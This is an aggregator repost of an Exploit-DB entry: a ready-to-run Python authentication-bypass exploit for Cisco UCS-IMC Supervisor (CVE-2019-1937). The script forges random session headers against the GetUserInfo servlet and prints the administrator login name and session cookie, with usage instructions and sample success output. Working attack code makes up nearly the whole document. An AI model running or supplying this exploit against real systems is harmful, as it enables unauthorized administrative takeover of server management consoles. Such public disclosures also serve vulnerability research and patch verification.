---
title: [webapps] Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass
url: https://buaq.net/go-172124.html
source: unSafe.sh - 不安全
date: 2023-07-16
fetch_date: 2025-10-04T11:51:14.011557
---

# [webapps] Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass

[+] Exploit Title: Cisco UCS-IMC Supervisor 2.2.0
*2023-7-15 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-172124.htm)
阅读量:20
收藏*

---

```
[+] Exploit Title: Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass
[+] Cisco IMC Supervisor - < 2.2.1.0
[+] Date: 08/21/2019
[+] Affected Component: /app/ui/ClientServlet?apiName=GetUserInfo
[+] Vendor: https://www.cisco.com/c/en/us/products/servers-unified-computing/integrated-management-controller-imc-supervisor/index.html
[+] Vulnerability Discovery : Pedro Ribeiro
[+] Exploit Author: Fatih Sencer
[+] CVE: CVE-2019-1937
----------------------------------------------------

Usage:

./python3 CiscoIMC-Bypass.py -u host

[+] Target https://xxxxxx.com
[+] Target OK
[+] Exploit Succes
[+] Login name : admin
[+] Cookie : REACTED

"""

import argparse,requests,warnings,base64,json,random,string
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser(description='Cisco IMC Supervisor / Authentication Bypass')
    parser.add_argument('-u','--host',help='Host', type=str, required=True)
    args = parser.parse_args()
    exploit(args)

def exploit(args):
    session = requests.Session()
    headers = {
        "User-Agent":                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)",
        "X-Requested-With":             "XMLHttpRequest",
        "Referer":                      "https://{}/".format(args.host),
        "X-Starship-UserSession-Key":   ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)),
        "X-Starship-Request-Key":   ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    }
    target = "https://{}/app/ui/ClientServlet?apiName=GetUserInfo".format(args.host)
    print("[+] Target {}".format(args.host))

    exp_send = session.get(target, headers=headers, verify=False, timeout=10)

    if exp_send.status_code == 200:
        print("[+] Target OK")
        body_data = json.loads(exp_send.text)
        if not (body_data.get('loginName') is None):
            print("[+] Exploit Succes")
            print("[+] Login name : {}".format(body_data.get('loginName')))
            print("[+] Cookie : {}".format(session.cookies.get_dict()))
        else:
            print("[-] Exploit Failed")

    else:
        print("[-] N/A")
        exit()

if __name__ == "__main__":
    init()
```

文章来源: https://www.exploit-db.com/exploits/51589
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)